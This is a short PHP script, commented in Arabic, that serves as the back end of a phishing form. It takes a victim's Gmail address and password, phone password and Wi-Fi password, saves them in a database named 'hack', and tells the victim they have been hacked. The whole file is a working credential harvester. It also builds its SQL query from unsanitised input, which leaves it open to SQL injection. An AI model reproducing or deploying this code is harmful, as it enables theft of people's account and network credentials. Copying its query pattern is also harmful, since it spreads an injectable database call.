<?php
// التحقق مما إذا كان النموذج قد أرسل
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // الحصول على البيانات المدخلة من المستخدم
    $gmail = $_POST['gmail'];
    $gmail_password = $_POST['gmail_password'];
    $phone_password = $_POST['phone_password'];
    $wifi_password = $_POST['wifi_password'];

    // الاتصال بقاعدة البيانات
    $conn = new mysqli('localhost', 'root', '', 'hack');

    // التحقق من الاتصال
    if ($conn->connect_error) {
        die("فشل الاتصال بقاعدة البيانات: " . $conn->connect_error);
    }

    // استعلام SQL لإدخال البيانات في جدول users
    $sql = "INSERT INTO users (gmail, gmail_password, phone_password, wifi_password) 
            VALUES ('$gmail', '$gmail_password', '$phone_password', '$wifi_password')";

    // تنفيذ الاستعلام والتحقق من النجاح
    if ($conn->query($sql) === TRUE) {
        echo "تم تهكيرك بنجاح!";
    } else {
        echo "حدث خطأ: " . $conn->error;
    }

    // إغلاق الاتصال
    $conn->close();
}
?>
